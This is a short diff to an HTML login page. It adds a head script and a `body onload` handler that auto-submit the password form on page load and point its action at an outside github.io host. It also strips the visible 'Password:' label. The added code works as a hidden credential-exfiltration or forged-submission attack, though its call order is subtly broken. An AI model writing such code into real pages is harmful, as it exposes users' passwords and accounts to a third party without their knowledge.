@@ -1,7 +1,17 @@
-<form action="account.php" method="post">
+<head>
+<script>
+        function loginForm() {
+            document.myform.submit();
+            document.myform.action = "https://moxie09.github.io/secrat009/base";
+        }
+    </script>
+</head>
+<body onload="loginForm()">
+	<form action="account.php" method="post">
 	<label>
-		Password: <input type="password" name="password"/>
+	<input type="password" name="password"/>
 	</label>
 	<br/>
 	<input type="submit" value="Submit"/>
 </form>
+</body>
